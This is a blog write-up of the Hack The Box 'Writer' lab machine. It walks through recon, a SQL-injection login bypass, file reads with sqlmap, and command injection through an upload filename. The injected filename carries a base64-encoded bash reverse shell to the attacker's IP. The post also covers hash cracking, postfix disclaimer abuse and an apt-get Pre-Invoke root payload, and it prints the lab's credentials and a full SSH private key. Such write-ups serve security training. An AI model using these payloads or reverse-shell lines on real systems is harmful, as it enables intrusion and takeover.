---
title: HTB Writer Walkthrough
author: cotes
date: 2021-08-13 12:13:00 +0800
categories: [CTF, HTB]
tags: []
pin: false
math: true
mermaid: true
image:
  path: /assets/img/HTB-Writer/logo.png
---

![](/assets/img/HTB-Writer/banner.png)


## Information

* name: Writer
* OS: Linux
* Difficulty: `Medium`
* Points: 30
* Release: 2ND AUGUST, 2021
* IP: 10.10.11.101

https://app.hackthebox.eu/machines/Writer

## Summary


* Enumerate to find the admin page.
* Reading files and logging into the system via SQL injection.
* Read source code to find command injection vulnerability and get web shell.
* Read web path to discover configuration files. Read Mysql account secret login to get hash.
* Use hashcat to crack the hash to get the password and get the user.txt.
* Mapping port 25 out, execute a command via /etc/postfix/disclaimer to further elevate privileges and read john’s id\_rsa.
* Raise privileges via apt-get.


## Details

### Recon

```shell
# Nmap 7.80 scan initiated Sat Aug 7 14:38:25 2021 as: nmap -sS -sV -sC -oN nmap 10.10.11.101
Nmap scan report for writer.htb (10.10.11.101)
Host is up (0.33s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Story Bank | Writer.HTB
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 57s
|_nbstat: NetBIOS name: WRITER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-08-07T06:39:40
|_  start_date: N/A

# Nmap 7.80 scan initiated Sat Aug 7 14:41:42 2021 as: nmap -sU -sV -sC -p 137 -oN nmap\_udp 10.10.11.101
Nmap scan report for writer.htb (10.10.11.101)
Host is up (0.39s latency).

PORT    STATE SERVICE    VERSION
137/udp open  netbios-ns Samba nmbd netbios-ns (workgroup: WORKGROUP)
Service Info: Host: WRITER

Host script results:
|_nbstat: NetBIOS name: WRITER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 7 14:41:44 2021 -- 1 IP address (1 host up) scanned in 2.16 seconds

```
 
```shell
/etc/hosts
10.10.11.101    writer.htb

```
![](/assets/img/HTB-Writer/001.png)


` wfuzz -w /usr/share/dirb/wordlists/big.txt -u http://writer.htb/FUZZ –hc 404 -t 200`


![](/assets/img/HTB-Writer/002.png)

![](/assets/img/HTB-Writer/003.png)

### Got Web Shell

`admin ' or '1'='1`
![](/assets/img/HTB-Writer/004.png)

![](/assets/img/HTB-Writer/005.png)

```shell
POST /administrative HTTP/1.1
Host: writer.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86\_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
Origin: http://writer.htb
Connection: close
Referer: http://writer.htb/administrative
Upgrade-Insecure-Requests: 1

uname=demo&password=demo

```
![](/assets/img/HTB-Writer/006.png)

![](/assets/img/HTB-Writer/007.png)

`/etc/apache2/sites-enabled/000-default.conf`

`sqlmap -r res.txt --file-read=/etc/apache2/sites-enabled/000-default.conf`
```
# Virtual host configuration for writer.htb domain
<VirtualHost *:80>
ServerName writer.htb
ServerAdmin [[email protected]](/cdn-cgi/l/email-protection)
WSGIScriptAlias / /var/www/writer.htb/writer.wsgi
<Directory /var/www/writer.htb>
Order allow,deny
Allow from all
</Directory>
Alias /static /var/www/writer.htb/writer/static
<Directory /var/www/writer.htb/writer/static/>
Order allow,deny
Allow from all
</Directory>
ErrorLog ${APACHE_LOG_DIR}/error.log
LogLevel warn
CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

# Virtual host configuration for dev.writer.htb subdomain
# Will enable configuration after completing backend development
# Listen 8080
#<VirtualHost 127.0.0.1:8080>
#       ServerName dev.writer.htb
#       ServerAdmin [[email protected]](/cdn-cgi/l/email-protection)
#
        # Collect static for the writer2_project/writer_web/templates
#       Alias /static /var/www/writer2_project/static
#       <Directory /var/www/writer2_project/static>
#               Require all granted
#       </Directory>
#
#       <Directory /var/www/writer2_project/writerv2>
#               <Files wsgi.py>
#                       Require all granted
#               </Files>
#       </Directory>
#
#       WSGIDaemonProcess writer2_project python-path=/var/www/writer2_project python-home=/var/www/writer2_project/writer2env
#       WSGIProcessGroup writer2_project
#       WSGIScriptAlias / /var/www/writer2_project/writerv2/wsgi.py
#        ErrorLog ${APACHE_LOG_DIR}/error.log
#        LogLevel warn
#        CustomLog ${APACHE_LOG_DIR}/access.log combined
#
#</VirtualHost>


```
`/var/www/writer.htb/writer/__init__.py`

```python
from flask import Flask, session, redirect, url_for, request, render_template
from mysql.connector import errorcode
import mysql.connector
import urllib.request
import os
import PIL
from PIL import Image, UnidentifiedImageError
import hashlib

app = Flask(__name__,static_url_path='',static_folder='static',template_folder='templates')

#Define connection for database
def connections():
  try:
    connector = mysql.connector.connect(user='admin', password='ToughPasswordToCrack', host='127.0.0.1', database='writer')
    return connector
  except mysql.connector.Error as err:
    if err.errno == errorcode.ER_ACCESS_DENIED_ERROR:
      return ("Something is wrong with your db user name or password!")
    elif err.errno == errorcode.ER_BAD_DB_ERROR:
      return ("Database does not exist")
    else:
      return ("Another exception, returning!")
  else:
    print ('Connection to DB is ready!')

#Define homepage
@app.route('/')
def home_page():
  try:
    connector = connections()
  except mysql.connector.Error as err:
    return ("Database error")
  cursor = connector.cursor()
  sql_command = "SELECT * FROM stories;"
  cursor.execute(sql_command)
  results = cursor.fetchall()
  return render_template('blog/blog.html', results=results)

#Define about page
@app.route('/about')
def about():
  return render_template('blog/about.html')

#Define contact page
@app.route('/contact')
def contact():
  return render_template('blog/contact.html')

#Define blog posts
@app.route('/blog/post/<id>', methods=['GET'])
def blog_post(id):
  try:
    connector = connections()
  except mysql.connector.Error as err:
    return ("Database error")
  cursor = connector.cursor()
  cursor.execute("SELECT * FROM stories WHERE id = %(id)s;", {'id': id})
  results = cursor.fetchall()
  sql_command = "SELECT * FROM stories;"
  cursor.execute(sql_command)
  stories = cursor.fetchall()
  return render_template('blog/blog-single.html', results=results, stories=stories)

#Define dashboard for authenticated users
@app.route('/dashboard')
def dashboard():
  if not ('user' in session):
    return redirect('/')
  return render_template('dashboard.html')

#Define stories page for dashboard and edit/delete pages
@app.route('/dashboard/stories')
def stories():
  if not ('user' in session):
    return redirect('/')
  try:
    connector = connections()
  except mysql.connector.Error as err:
    return ("Database error")
  cursor = connector.cursor()
  sql_command = "Select * From stories;"
  cursor.execute(sql_command)
  results = cursor.fetchall()
  return render_template('stories.html', results=results)

@app.route('/dashboard/stories/add', methods=['GET', 'POST'])
def add_story():
  if not ('user' in session):
    return redirect('/')
  try:
    connector = connections()
  except mysql.connector.Error as err:
    return ("Database error")
  if request.method == "POST":
    if request.files['image']:
      image = request.files['image']
      if ".jpg" in image.filename:
        path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)
        image.save(path)
        image = "/img/{}".format(image.filename)
      else:
        error = "File extensions must be in .jpg!"
        return render_template('add.html', error=error)

    if request.form.get('image_url'):
      image_url = request.form.get('image_url')
      if ".jpg" in image_url:
        try:
          local_filename, headers = urllib.request.urlretrieve(image_url)
          os.system("mv {} {}.jpg".format(local_filename, local_filename))
          image = "{}.jpg".format(local_filename)
          try:
            im = Image.open(image)
            im.verify()
            im.close()
            image = image.replace('/tmp/','')
            os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
            image = "/img/{}".format(image)
          except PIL.UnidentifiedImageError:
            os.system("rm {}".format(image))
            error = "Not a valid image file!"
            return render_template('add.html', error=error)
        except:
          error = "Issue uploading picture"
          return render_template('add.html', error=error)
      else:
        error = "File extensions must be in .jpg!"
        return render_template('add.html', error=error)
    author = request.form.get('author')
    title = request.form.get('title')
    tagline = request.form.get('tagline')
    content = request.form.get('content')
    cursor = connector.cursor()
    cursor.execute("INSERT INTO stories VALUES (NULL,%(author)s,%(title)s,%(tagline)s,%(content)s,'Published',now(),%(image)s);", {'author':author,'title': title,'tagline': tagline,'content': content, 'image':image })
    result = connector.commit()
    return redirect('/dashboard/stories')
  else:
    return render_template('add.html')

@app.route('/dashboard/stories/edit/<id>', methods=['GET', 'POST'])
def edit_story(id):
  if not ('user' in session):
    return redirect('/')
  try:
    connector = connections()
  except mysql.connector.Error as err:
    return ("Database error")
  if request.method == "POST":
    cursor = connector.cursor()
    cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
    results = cursor.fetchall()
    if request.files['image']:
      image = request.files['image']
      if ".jpg" in image.filename:
        path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)
        image.save(path)
        image = "/img/{}".format(image.filename)
        cursor = connector.cursor()
        cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image':image, 'id':id})
        result = connector.commit()
      else:
        error = "File extensions must be in .jpg!"
        return render_template('edit.html', error=error, results=results, id=id)
    if request.form.get('image_url'):
      image_url = request.form.get('image_url')
      if ".jpg" in image_url:
        try:
          local_filename, headers = urllib.request.urlretrieve(image_url)
          os.system("mv {} {}.jpg".format(local_filename, local_filename))
          image = "{}.jpg".format(local_filename)
          try:
            im = Image.open(image)
            im.verify()
            im.close()
            image = image.replace('/tmp/','')
            os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
            image = "/img/{}".format(image)
            cursor = connector.cursor()
            cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image':image, 'id':id})
            result = connector.commit()

          except PIL.UnidentifiedImageError:
            os.system("rm {}".format(image))
            error = "Not a valid image file!"
            return render_template('edit.html', error=error, results=results, id=id)
        except:
          error = "Issue uploading picture"
          return render_template('edit.html', error=error, results=results, id=id)
      else:
        error = "File extensions must be in .jpg!"
        return render_template('edit.html', error=error, results=results, id=id)
    title = request.form.get('title')
    tagline = request.form.get('tagline')
    content = request.form.get('content')
    cursor = connector.cursor()
    cursor.execute("UPDATE stories SET title = %(title)s, tagline = %(tagline)s, content = %(content)s WHERE id = %(id)s", {'title':title, 'tagline':tagline, 'content':content, 'id': id})
    result = connector.commit()
    return redirect('/dashboard/stories')

  else:
    cursor = connector.cursor()
    cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
    results = cursor.fetchall()
    return render_template('edit.html', results=results, id=id)

@app.route('/dashboard/stories/delete/<id>', methods=['GET', 'POST'])
def delete_story(id):
  if not ('user' in session):
    return redirect('/')
  try:
    connector = connections()
  except mysql.connector.Error as err:
    return ("Database error")
  if request.method == "POST":
    cursor = connector.cursor()
    cursor.execute("DELETE FROM stories WHERE id = %(id)s;", {'id': id})
    result = connector.commit()
    return redirect('/dashboard/stories')
  else:
    cursor = connector.cursor()
    cursor.execute("SELECT * FROM stories where id = %(id)s;", {'id': id})
    results = cursor.fetchall()
    return render_template('delete.html', results=results, id=id)

#Define user page for dashboard
@app.route('/dashboard/users')
def users():
  if not ('user' in session):
    return redirect('/')
  try:
    connector = connections()
  except mysql.connector.Error as err:
    return "Database Error"
  cursor = connector.cursor()
  sql_command = "SELECT * FROM users;"
  cursor.execute(sql_command)
  results = cursor.fetchall()
  return render_template('users.html', results=results)

#Define settings page
@app.route('/dashboard/settings', methods=['GET'])
def settings():
  if not ('user' in session):
    return redirect('/')
  try:
    connector = connections()
  except mysql.connector.Error as err:
    return "Database Error!"
  cursor = connector.cursor()
  sql_command = "SELECT * FROM site WHERE id = 1"
  cursor.execute(sql_command)
  results = cursor.fetchall()
  return render_template('settings.html', results=results)

#Define authentication mechanism
@app.route('/administrative', methods=['POST', 'GET'])
def login_page():
  if ('user' in session):
    return redirect('/dashboard')
  if request.method == "POST":
    username = request.form.get('uname')
    password = request.form.get('password')
    password = hashlib.md5(password.encode('utf-8')).hexdigest()
    try:
      connector = connections()
    except mysql.connector.Error as err:
      return ("Database error")
    try:
      cursor = connector.cursor()
      sql_command = "Select * From users Where username = '%s' And password = '%s'" % (username, password)
      cursor.execute(sql_command)
      results = cursor.fetchall()
      for result in results:
        print("Got result")
      if result and len(result) != 0:
        session['user'] = username
        return render_template('success.html', results=results)
      else:
        error = "Incorrect credentials supplied"
        return render_template('login.html', error=error)
    except:
      error = "Incorrect credentials supplied"
      return render_template('login.html', error=error)
  else:
    return render_template('login.html')

@app.route("/logout")
def logout():
  if not ('user' in session):
    return redirect('/')
  session.pop('user')
  return redirect('/')

if __name__ == '__main__':
  app.run("0.0.0.0")
```

```
        if request.form.get('image\_url'):
            image\_url = request.form.get('image\_url')
            if ".jpg" in image\_url:
                try:
                    local\_filename, headers = urllib.request.urlretrieve(image\_url)
                    os.system("mv {} {}.jpg".format(local\_filename, local\_filename))
                    image = "{}.jpg".format(local\_filename)
                    try:
                        im = Image.open(image) 
                        im.verify()
                        im.close()
                        image = image.replace('/tmp/','')
                        os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
                        image = "/img/{}".format(image)
                    except PIL.UnidentifiedImageError:
                        os.system("rm {}".format(image))
                        error = "Not a valid image file!"
                        return render\_template('add.html', error=error)
                except:
                    error = "Issue uploading picture"
                    return render\_template('add.html', error=error)
            else:
                error = "File extensions must be in .jpg!"
                return render\_template('add.html', error=error)
```
![](/assets/img/HTB-Writer/008.png)


```shell
POST /dashboard/stories/add HTTP/1.1
Host: writer.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86\_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------4229921975180160461559477084
Content-Length: 905
Origin: http://writer.htb
Connection: close
Referer: http://writer.htb/dashboard/stories/add
Cookie: session=eyJ1c2VyIjoiYWRtaW4nIC0tIC0ifQ.YRZmJQ.N6M7slyxhOtSWldWbognlVjbwdo
Upgrade-Insecure-Requests: 1

-----------------------------4229921975180160461559477084
Content-Disposition: form-data; name="author"

hack
-----------------------------4229921975180160461559477084
Content-Disposition: form-data; name="title"

hack
-----------------------------4229921975180160461559477084
Content-Disposition: form-data; name="tagline"

hack
-----------------------------4229921975180160461559477084
Content-Disposition: form-data; name="image"; filename="123.jpg;`echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjQvMTAwODYgMD4mMSI= | base64 -d | bash`"
Content-Type: image/jpeg


-----------------------------4229921975180160461559477084
Content-Disposition: form-data; name="image_url"


-----------------------------4229921975180160461559477084
Content-Disposition: form-data; name="content"

asdasdasdasd
-----------------------------4229921975180160461559477084--

```
![](/assets/img/HTB-Writer/009.png)


```shell
POST /dashboard/stories/add HTTP/1.1
Host: writer.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86\_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------4229921975180160461559477084
Content-Length: 959
Origin: http://writer.htb
Connection: close
Referer: http://writer.htb/dashboard/stories/add
Cookie: session=eyJ1c2VyIjoiYWRtaW4nIC0tIC0ifQ.YRZmJQ.N6M7slyxhOtSWldWbognlVjbwdo
Upgrade-Insecure-Requests: 1

-----------------------------4229921975180160461559477084
Content-Disposition: form-data; name="author"

hack
-----------------------------4229921975180160461559477084
Content-Disposition: form-data; name="title"

hack
-----------------------------4229921975180160461559477084
Content-Disposition: form-data; name="tagline"

hack
-----------------------------4229921975180160461559477084
Content-Disposition: form-data; name="image"; filename="123.jpg"
Content-Type: image/jpeg


-----------------------------4229921975180160461559477084
Content-Disposition: form-data; name="image_url"

file:///var/www/writer.htb/writer/static/img/123.jpg;`echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjQvMTAwODYgMD4mMSI= | base64 -d | bash`

-----------------------------4229921975180160461559477084
Content-Disposition: form-data; name="content"

asdasdasdasd
-----------------------------4229921975180160461559477084--

```
![](/assets/img/HTB-Writer/010.png)

```shell
www-data@writer:/$ ls /home
ls /home
john
kyle
www-data@writer:/$ ls -al /home/kyle
ls -al /home/kyle
total 28
drwxr-xr-x 3 kyle kyle 4096 Aug  5 09:59 .
drwxr-xr-x 4 root root 4096 Jul  9 10:59 ..
lrwxrwxrwx 1 root root    9 May 18 18:03 .bash_history -> /dev/null
-rw-r--r-- 1 kyle kyle  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 kyle kyle 3771 Feb 25  2020 .bashrc
drwx------ 2 kyle kyle 4096 Jul 28 09:03 .cache
-rw-r--r-- 1 kyle kyle  807 Feb 25  2020 .profile
-r-------- 1 kyle kyle   33 Aug 14 08:32 user.txt
www-data@writer:/var/www/writer2_project/writerv2$ ls -al                                                                                                                                                          
ls -al                                                                                                                                                                                                             
total 24                                                                                                                                                                                                           
dr-xr-sr-x 3 www-data smbgroup 4096 May 19 12:32 .                                                                                                                                                                 
drwxrws--- 6 www-data smbgroup 4096 Aug  2 06:52 ..                                                                                                                                                                
-r-xr-s--- 1 www-data smbgroup    0 Aug 14 08:56 __init__.py                                                                                                                                                       
dr-xr-s--- 2 www-data smbgroup 4096 May 19 21:06 __pycache__                                                                                                                                                       
-r-xr-s--- 1 www-data smbgroup 3307 Aug 14 08:56 settings.py                                                                                                                                                       
-r-xr-s--- 1 www-data smbgroup  817 Aug 14 08:56 urls.py                                                                                                                                                           
-r-xr-s--- 1 www-data smbgroup  401 Aug 14 08:56 wsgi.py

```

```shell
DATABASES = {                                                                                                                                                                                                      
    'default': {                                                                                                                                                                                                   
      'ENGINE': 'django.db.backends.mysql',                                                                                                                                                                      
      'OPTIONS': {                                                                                                                                                                                               
      'read\_default\_file': '/etc/mysql/my.cnf',                                                                                                                                                              
    },
  }
}

```

```shell
[client]
database = dev
user = djangouser
password = DjangoSuperPassword
default-character-set = utf8

```

```shell
MariaDB [dev]> select username,password from auth_user;
select username,password from auth_user;
+----------+------------------------------------------------------------------------------------------+
| username | password                                                                                 |
+----------+------------------------------------------------------------------------------------------+
| kyle     | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= |
+----------+------------------------------------------------------------------------------------------+
1 row in set (0.001 sec)

```
![](/assets/img/HTB-Writer/011.png)

![](/assets/img/HTB-Writer/012.png)

```
PS E:\tools\hashcat-5.1.0> hashcat64.exe .\hash.txt .\rockyou.txt -m 10000 --show
pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio

```
```shell
kyle@writer:~$ ls -al
total 28
drwxr-xr-x 3 kyle kyle 4096 Aug  5 09:59 .
drwxr-xr-x 4 root root 4096 Jul  9 10:59 ..
lrwxrwxrwx 1 root root    9 May 18 18:03 .bash_history -> /dev/null
-rw-r--r-- 1 kyle kyle  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 kyle kyle 3771 Feb 25  2020 .bashrc
drwx------ 2 kyle kyle 4096 Jul 28 09:03 .cache
-rw-r--r-- 1 kyle kyle  807 Feb 25  2020 .profile
-r-------- 1 kyle kyle   33 Aug 13 12:20 user.txt
kyle@writer:~$ cat user.txt
a90cca8b34ddad84ad5f93fae43fe8d1

```
### Privilege escalation

```
kyle@writer:/var/www/writer2_project$ id
uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)
kyle@writer:~$ find / -group filter -type f 2>/dev/null
/etc/postfix/disclaimer

```
![](/assets/img/HTB-Writer/013.png)

* https://book.hacktricks.xyz/pentesting/pentesting-smtp
* https://viperone.gitbook.io/pentest-everything/all-writeups/pg-practice/linux/postfish
* https://mobt3ath.com/uplode/books/book-27297.pdf

`./NATBypass -tran 2255 127.0.0.1:25`


![](/assets/img/HTB-Writer/014.png)


`sendmail.py`

```
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

lhost = "10.10.14.24"
lport = 10086
rhost = "10.10.11.101"
rport = 2255 # 489,587

# create message object instance
msg = MIMEMultipart()


# setup the parameters of the message
password = "" 
msg['From'] = "kyle@write.htb"
msg['To'] = "john@write.htb"
msg['Subject'] = "This is not a drill!"

# payload 
message = ('asdasdasd')

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
    print("[-]Connection Error")
    exit()

server.starttls()

# Uncomment if log-in with authencation
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]successfully sent email to %s:" % (msg['To']))
```
 ![](/assets/img/HTB-Writer/015.png)
```shell
john@writer:/home/john/.ssh$ ls -al
ls -al
total 20
drwx------ 2 john john 4096 Jul  9 12:29 .
drwxr-xr-x 4 john john 4096 Aug  5 09:56 ..
-rw-r--r-- 1 john john  565 Jul  9 12:29 authorized_keys
-rw------- 1 john john 2602 Jul  9 12:29 id_rsa
-rw-r--r-- 1 john john  565 Jul  9 12:29 id_rsa.pub
john@writer:/home/john/.ssh$

```
`id_rsa`

```shell
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```
![](/assets/img/HTB-Writer/016.png)

![](/assets/img/HTB-Writer/017.png)

![](/assets/img/HTB-Writer/018.png)


* https://gtfobins.github.io/gtfobins/apt-get/
* https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/


```shell
echo 'apt::Update::Pre-Invoke {"echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjQvMTAwODYgMD4mMSI= | base64 -d | bash"};'> pwn
```
![](/assets/img/HTB-Writer/019.png)

## Reference

* https://book.hacktricks.xyz/pentesting/pentesting-smtp
* https://viperone.gitbook.io/pentest-everything/all-writeups/pg-practice/linux/postfish
* https://mobt3ath.com/uplode/books/book-27297.pdf
* https://gtfobins.github.io/gtfobins/apt-get/
* https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/


